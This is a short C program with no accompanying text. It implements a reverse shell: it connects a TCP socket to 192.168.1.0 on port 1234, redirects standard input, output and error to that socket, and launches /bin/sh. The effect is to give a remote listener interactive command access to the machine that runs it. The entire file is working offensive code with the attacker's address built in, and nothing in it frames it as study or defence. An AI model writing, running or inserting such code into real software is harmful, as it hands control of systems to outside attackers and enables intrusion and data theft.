#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {

	int sockt;
	int port = 1234;
	struct sockaddr_in revsockaddr;

	sockt = socket(AF_INET, SOCK_STREAM, 0);

	revsockaddr.sin_family = AF_INET;
	revsockaddr.sin_port = htons(port);
	revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.0");

	connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
	
	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);

	char * const argv[] = {"/bin/bash", NULL};
	execve("/bin/sh", argv, NULL);
	
	return 0;
}

